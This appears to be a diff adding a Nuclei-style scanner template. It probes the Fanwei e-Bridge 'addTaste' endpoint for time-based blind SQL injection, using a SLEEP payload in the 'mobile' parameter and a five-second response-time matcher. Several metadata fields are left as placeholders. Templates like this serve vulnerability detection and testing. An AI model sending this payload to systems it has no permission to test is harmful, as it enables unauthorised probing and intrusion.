@@ -1,0 +1,32 @@
+id: fanwei-e-Bridge-addTaste-sql
+
+info:
+  name: 泛微云桥e-Bridge addTaste接口SQL注入漏洞
+  author: changge
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+requests:
+  - raw:
+      - |+
+        GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+      - type: status
+        status:
+          - 200
